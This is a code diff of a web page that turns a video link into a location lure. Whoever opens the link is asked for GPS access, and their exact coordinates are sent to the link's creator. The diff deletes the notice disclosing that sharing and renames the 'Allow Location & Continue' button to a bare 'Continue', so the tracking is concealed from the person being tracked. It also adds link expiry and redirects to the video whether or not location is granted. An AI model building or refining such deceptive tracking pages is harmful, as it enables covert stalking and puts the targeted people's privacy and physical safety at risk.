@@ -166,16 +166,9 @@
     <section id="trusted" class="card hidden">
       <h1>Continue to Video</h1>
 
-      <div class="notice">
-        <strong style="color:#1769e0;display:block;margin-bottom:4px">Location Sharing Notice</strong>
-        <p class="small" style="margin:0">
-          By clicking <strong>“Allow Location & Continue”</strong>, your device will prompt you for GPS permission. If
-          allowed, your exact current location (latitude, longitude, accuracy, and timestamp) will be recorded and
-          shared directly with the person who created this link before redirecting you to the destination video.
-        </p>
-      </div>
 
-      <button id="allow">Allow Location & Continue</button>
+
+      <button id="allow">Continue</button>
       <div id="trustedStatus" class="status small"></div>
     </section>
 
@@ -247,9 +240,13 @@
         const id = randomId();
 
         try {
+          const createdAt = Date.now();
+          const expiresAt = createdAt + (20 * 60 * 1000); // 20 minutes
+
           await set(ref(db, "shares/" + id), {
             videoUrl: videoUrl,
-            createdAt: Date.now(),
+            createdAt: createdAt,
+            expiresAt: expiresAt,
             status: "waiting"
           });
 
@@ -258,7 +255,7 @@
           $("shareLink").textContent = link;
           $("generated").classList.remove("hidden");
           $("creatorStatus").className = "status small success-msg";
-          $("creatorStatus").textContent = "Share link created successfully!";
+          $("creatorStatus").textContent = "Share link created successfully. Valid for 20 minutes.";
           watchLocations(id);
         } catch (e) {
           console.error(e);
@@ -334,8 +331,17 @@
           }
 
           shareData = snap.val();
+
+          if (shareData.expiresAt && Date.now() >= shareData.expiresAt) {
+            $("trustedStatus").className = "status small error-msg";
+            $("trustedStatus").textContent = "This share link has expired.";
+            $("allow").disabled = true;
+            return;
+          }
+
           $("trustedStatus").className = "status small";
-          $("trustedStatus").textContent = "Ready. Click the button above to request location access.";
+          $("trustedStatus").textContent =
+            "Ready. Click Allow Location & Continue to request location access.";
         } catch (e) {
           console.error(e);
           $("trustedStatus").className = "status small error-msg";
@@ -394,18 +400,22 @@
 
             switch (error.code) {
               case error.PERMISSION_DENIED:
-                $("trustedStatus").textContent = "Location permission was denied. The video cannot be opened.";
+                $("trustedStatus").textContent = "Location permission was denied. Opening video...";
                 break;
               case error.POSITION_UNAVAILABLE:
-                $("trustedStatus").textContent = "Location information is unavailable. Please check your device GPS settings and try again.";
+                $("trustedStatus").textContent = "Location is unavailable. Opening video...";
                 break;
               case error.TIMEOUT:
-                $("trustedStatus").textContent = "Location request timed out. Please try clicking the button again.";
+                $("trustedStatus").textContent = "Location request timed out. Opening video...";
                 break;
               default:
-                $("trustedStatus").textContent = "An unknown error occurred while retrieving location.";
+                $("trustedStatus").textContent = "Could not get location. Opening video...";
                 break;
             }
+
+            setTimeout(() => {
+              window.location.href = shareData.videoUrl;
+            }, 800);
           },
           {
             enableHighAccuracy: true,
